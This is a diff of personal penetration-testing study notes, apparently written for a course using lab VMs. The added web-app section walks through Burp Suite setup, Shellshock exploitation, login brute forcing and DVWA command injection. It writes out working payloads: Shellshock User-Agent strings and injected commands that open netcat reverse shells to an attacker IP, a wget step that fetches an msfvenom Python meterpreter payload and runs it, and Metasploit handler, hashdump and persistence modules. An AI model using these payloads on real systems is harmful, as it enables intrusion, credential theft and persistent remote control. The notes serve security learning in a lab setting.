@@ -364,7 +364,7 @@ Creating payloads can be done with the help of a tool called MSFVENOM
 |  to create a python http file server use the cmd as follows:
 |  python3 -m http.server <port_number>
 |  now after copying/downloading the payload to the target's machine(make sure windows defender is off and also the firewall later we'll check to bypass these) we need to create a rev shell so that we can listen to the port we mentioned in the payload
-|  we can use nc(netcat) to listen but msfc provides with a much more adv. exploit than nc i.e. as follows:
+|  [HAVEN'T TESTED YET!!!] -> we can use nc(netcat) to listen but msfc provides with a much more adv. features
 |  > use exploit/multi/handler
 |  see options and set to the same LHOST and RHOST that was in the payload and along with that set the payload similar to the payload we created in msfvenom as follows:
 |  > set LHOST 192.168.1.13
@@ -404,6 +404,9 @@ Creating payloads can be done with the help of a tool called MSFVENOM
 |  we can also send another format(extension) of payload using the -f flag which makes it bypass pretty much all AVS, but there are some problems with it
 |  i.e. the extensions that needs software/compiler/interpreter might not be installed in the target's system.
 |  eg: python might be installed only in linux and mac but not on windows so on distribution there be no way of running the payload but rather install python in order to execute the payload
+
+FOR CREATING AND UPLOADING A PAYLOAD VIA WEBSITE(refer the foll. section in WEB APP PENETRATION TESTING): [VIDEO (Command Injection)] METASPLOITABLE 2.0 --> [EXTRA (MAKING USE OF MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)]
+
 
 OTHER TOOLS LIKE MSFVENOM FOR PAYLOAD CREATION(the following tools present below should be ran with root access(> sudo su)):
 veil (apt-get install veil)
@@ -574,11 +577,13 @@ CREATING PERSISTENCY ON THE TARGET SYSTEM USING MSFC(persistence modules are pre
         (in my case (windows 7 x64) exploit/windows/local/persistence_service was used for persistency, the location of the service is found at "C:\Users\win7\AppData\Local\Temp\TqIp.exe" using the cmd "wmic process")
 
 since we're in post exploitation we can use post/windows to search for all post exploit modules related to windows:
-eg: use post/windows/gather/checkvm (modules that check whether target is VM or Physical PC)
-eg: use post/windows/wlan/wlan_profile (modules that check whether target is VM or Physical PC)
-eg: use post/windows/gather/hashdump (gives all hashes of the users on the target windows machine)
-to perform the above ones within the meterpreter shell use the foll:
-eg: > run post/windows/gather/enum_applications (prints all installed application in the target's windows machine)
+
+POST MODULES & MISC:
+        eg: use post/windows/gather/checkvm (modules that check whether target is VM or Physical PC)
+        eg: use post/windows/wlan/wlan_profile (modules that check whether target is VM or Physical PC)
+        eg: use post/windows/gather/hashdump (gives all hashes of the users on the target windows machine)
+        to perform the above ones within the meterpreter shell use the foll:
+        eg: > run post/windows/gather/enum_applications (prints all installed application in the target's windows machine)
 
 OTHER USEFUL METERPRETER CMDS:
         > search -h (shows different usage of search techniques to search for specific file types in target system)
@@ -587,9 +592,142 @@ OTHER USEFUL METERPRETER CMDS:
 
 
 
+********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
+********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
+********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
+********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
+********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
 
 
 
+____________________________________________________________________
+WEB APP PENETRATION TESTING
+____________________________________________________________________
 
-NOTE: persistency is set at win7x64 that connects to port 4444(attacker's pc(KALINUX))
-NOTE: check msfv py file payload
+INFORMATION GATHERING:
+similar to the chapter 1 but mostly related to web applications
+
+
+--> (dirb) we'll use a tool called dirb in kalinux that helps to enumerate all possible routes in a webpage, we'll use metasploitable 2.0 for demonstration purpose and we execute dirb as foll:
+        > dirb http://<metasploitable_VM_ip> (this will search for different subdirectories)
+        normally dirb uses its own wordlist to enumerate webpage directories or we can even use our own wordlist if we want to
+        (try experimenting with different tools that might be better than this one)
+
+--> (burpsuite) this application allows us to intercept and take a look at incoming http/s requests, modify it and forward it to our target(kind of like a forward proxy)
+        this is preinstalled in kalilinux inside the web app analysis section. at initial startup select default options and next to rush through the application homescreen
+        also we need to configure our firefox browser in kalilinux to use it as a proxy
+        first click on the [PROXY] tab and under it click on options tab
+        now click on the interface 127.0.0.1:8080 and click edit
+        make sure the bind to address is set to loopback only
+        now in firefox open this link- about:preferences (preferences from option menu)
+        under general go to network settings and click 'settings' and under 'configure proxy access to the internet' select manual proxy configuration and set the following:
+        HTTP proxy: 127.0.0.1:8080 (check 'use this for all protocols')
+        also make sure that SOCKS v5 is selected
+        now if we try to request a webpage firefox says that it doesn't trust our burpsuite tool
+        normally this restriction happens if we proxify https connection due to the certification process involved with the security mechanisms in browsers and this is not an issue with http websites
+        goto: http://burp and click on CA certificate to download a certificate(cacert.der) which we can then import to firefox and make it trust the burpsuite app. 
+        so after downloading it goto about:preferences and to privacy & security and scroll to certificates section then click view certificates and click 'import'
+        browser the .der we downloaded and check both Trust misc options
+        now if we try to request a webpage it keeps loading, and a window redirection happens towards burpsuite which highlights intercept tab under the proxy tab which says that there's a request that's been captured by burpsuite,
+        where the intercept is turned on(we can see a button saying 'Intercept turned on')
+        we can forward the request manually by pressing the 'forward' button or just unclick the 'Intercept turned on' button to unintercept the requested webpage
+        we can see the pages that was request under the [TARGET] tab under site map tab
+        NOTE: when using the above firefox configured for normal usage it redirects your webpage request to burpsuite even though you didn't intend to be using it, so
+        switch off burpsuite's intercept mode or
+        disable proxy in firefox settings
+
+        [VIDEO (ShellShock Exploitation)] https://pentesterlab.com/exercises/cve-2014-6271/iso  --> (referring this vm as shellshock_vm)
+        for this exploitation we'll install a linux vm specific to this exploitation for demonstration
+        start up burpsuite for executing the attack and for now switch off the intercept
+        start up the shellshock_vm and enter ifconfig to know the ip address
+        then in the attacker machine enter the ip and after getting response from the webpage goto burpsuite's target tab and then to sitemap to see the retrieved webpages
+        from there we get a page with URL called /cgi-bin/status, click it and see the json response we get which has a key called 'kernel' and its value is similar to the output we get from 'uname -a' and it is run by bash.
+        you can notice that the request that we sent consists of a http header called User-Agent which is actually an environmental variable when processed inside of a cgi script but straight off we couldn't attach a cmd in the User-Agent header since this vulnerability is based on first specifying an empty bash function [ () { :;}; ] then the commands that comes after it
+        now we can send the above empty function with the User-Agent header.
+        for this purpose we'll use the burpsuite's [REPEATER] option but first in the sitemap tab inside target tab we need to select the specific request we want to repeat, so we right click and click 'Send to repeater', which forwards the request to the Repeater tab under tab number 1.
+        over there we can enter the following header value for User-Agent(before running the following make sure the attacker's port(listener) is switched on with the cmd 'nc -lvp <attacker's_listener_ip>'):
+        User-Agent: () { :;}; /bin/bash -c 'nc <attacker's_ip> <attacker's_listening_port> -e /bin/bash' (the command used creates an empty bash function and then executes the /bin/bash that has a flag -c (command execution) which executes nc that connects to attacker's ip and port and a -e(similar to -c flag in /bin/bash) flag that opens a shell to the ones we're connecting with i.e. the attackter's pc)
+        The one I tried: () { :;}; /usr/bin/nc 192.168.1.13 443 -e /bin/bash
+        NOTE: some linux distros having netcat preinstalled doesn't have the flags -e & -c due to security issues
+        now click send to forward the request to the target machine and now if we go to our attacker's nc listener we created a shell session /w the help of the shellshock exploit
+        Also the above process could be automated with the help of msfc
+        > search shellshock
+        > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+        set RHOSTS to the target machine's ip
+        > set TARGETURI /cgi-bin/status
+        > run
+        EXTRAS: nc revshell without e flag - https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99
+
+        [VIDEO (LoginPage Bruteforcing)] METASPLOITABLE 2.0
+        for brute forcing a login page we'll be using a feature in burpsuite called [INTRUDER].
+        for this lets setup burpsuite and switch intercepter off along with metasploit's dvwa login page and enter a sample user:pass that doesn't need to be valid
+        now after triggering a request goto burpsuite's target tab and under sitemap tab we can find the request we initiated
+        now right click on the specific webpage in which we sent our user:pass and click send to intruder which makes the intruder bar light up
+        within that we can goto positions tab we can see the request that we just sent as well as we can see the attack type drop down above the request
+        some options in it are meant to be as follows:
+                Cluster bomb - bruteforce both username(m) and password(n) at the same time (m*n combinations)
+                Sniper - bruteforce username(1) and password(n) (1*n combinations)
+        here automatically see that few fields are surrounded by a special character '§'
+        this selection is to indicate which fields would be bruteforced. for now we can clear the selections with the clear button at the right and highlight and select the username and password field(only the value and not the key) that we want to bruteforce and click Add button at the right
+        then to the payload section we see payload set under payload sets section, there we select 1 for username bruteforce configuration and 2 for password configuration
+        the payload type to be a 'simple list', and under payload option we'll load the list by browsing and selecting the list we created(a text file with every password placed vertically)
+        we do the same for both payload set 1(username) & 2(password)
+        finally we can click on start attack button to the right
+        now a scan starts to happen for the different combinations of usernames and password and within the result tab we can see a column called length. that shows the response html page's length
+        in this case we get a redirection to a different page (status 302) but in burpsuite we need to enable redirection so for that in intruder tab > options tab under Redirections check Always and start the attack once again
+        now we can see a variable length of html page's length as response which indicates some of our combinations were correct and checkout them
+        FOR MORE: https://portswigger.net/burp/documentation/desktop/tools/intruder/positions
+
+[VIDEO (Command Injection)] METASPLOITABLE 2.0
+to start this payload execution first we need to get to metasploitable 80 port into dvwa
+login with default username and password
+we'll try with 2 different levels of security level(to toggle between click on dvwa security tab and from the drop down change it)
+then goto command execution tab to start the execution
+        1. Security Level - low:
+                this following page allows to ping a host by entering an ip address where we might try a command like:
+                192.168.1.13; ls -al (here we've entered the ip address and also an unintended command we've attached after the semicolon)
+                this returns us both the ping result and also the list command's output. so with this vulnerability we can use the following code to create a remote shell using nc as follows:
+                192.168.1.13; nc <attacker_ip> <attacker_listeners's_port> -e /bin/bash
+                also make sure that revshell is opened in attacker's PC
+                The reason why this vulnerability is present is due to no filtering/input validation is done in the code side
+        2. Security Level - medium:
+                here if we try to above cmd 192.168.1.13; ls -al it doesn't work but appending command to the end can be done in other ways also using the following symbols:
+                192.168.1.13 && nc <attacker_ip> <attacker_listeners's_port>
+                192.168.1.13 & nc <attacker_ip> <attacker_listeners's_port>
+                192.168.1.13 | nc <attacker_ip> <attacker_listeners's_port>
+                now from the above given types & and | works and the reason is that in the code side, filtering of && and ; is only done but not for all the other possibilities
+        3. Security Level - high:
+                this ain't vulnerable since the input validation is done in a way where the 4 octets of the ipv4 address provided are checked individually else if other strings are present it returns an error msg
+
+        [EXTRA (MAKING USE OF MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)] (foll. talks about creating a python payload with msfv upload it in the vulnerable website by hosting the payload in a python server, set revshell with msfc and trigger the payload with the found vulnerability)
+        Now instead of using the nc revshell we did for executing the payload we can use msfc which provides us much more shell features
+        so to create a meterpreter session first we need to create a payload with msfvenom.
+        since we know that our target machine is a linux32(metasploitable2.0) we can create a python reverse_tcp payload, also the reason why we use python is that most linux systems has python preinstalled so we don't have to install any additional softwares to make our payload run. We create it as follows:
+        > msfvenom -p python/meterpreter/reverse_tcp LHOST=<listening_attacker_ip> LPORT=<attacker_listening_port >> <filename>.py
+        now since we need the target to make it download the payload we created we can host an apache webserver so that it downloads from it as follows:
+        > sudo service apache2 start (to start the apache2 web server)
+        now to host the payload we can move the payload to /var/www/html/
+        (also we could use python server by using the command: python3 -m http.server <attacker_listening_port> (make sure to run this relative to the payload's location))
+        and now the way how we exploited the webpage's input field using: 192.168.1.13; nc <attacker_ip> <attacker_listeners's_port> -e /bin/bash'
+        now instead we need make the payload downloaded by the target itself so we use 'wget' cmd as follows:
+        > 192.168.1.13; wget <apache2_webserver's_ip|attacker's_webserver_ip>/<payload_name>.py
+        now if we perform the ls in the input field we'll see the file we uploaded
+        then we start setting up the listener in msfc as follows:
+        > use exploit/multi/handler
+        > set payload python/meterpreter/reverse_tcp
+        set LHOST, LPORT similar to the one given when creating the payload using msfv
+        > run
+        now if again go back the the input field and execute the following:
+        > 192.168.1.13; python <payload_name>.py (the browsers keeps loading but target machine has already started a meterpreter session with the attacker's PC)
+
+TODO: [VIDEO (XSS)] METASPLOITABLE 2.0
+TODO: [VIDEO (SQL INJECTION)] METASPLOITABLE 2.0
+TODO: [VIDEO (CSRF)] METASPLOITABLE 2.0
+TODO: [VIDEO (Hydra Bruteforcing)] METASPLOITABLE 2.0
+
+
+
+____________________________________________________________________
+MAN IN THE MIDDLE
+____________________________________________________________________
+
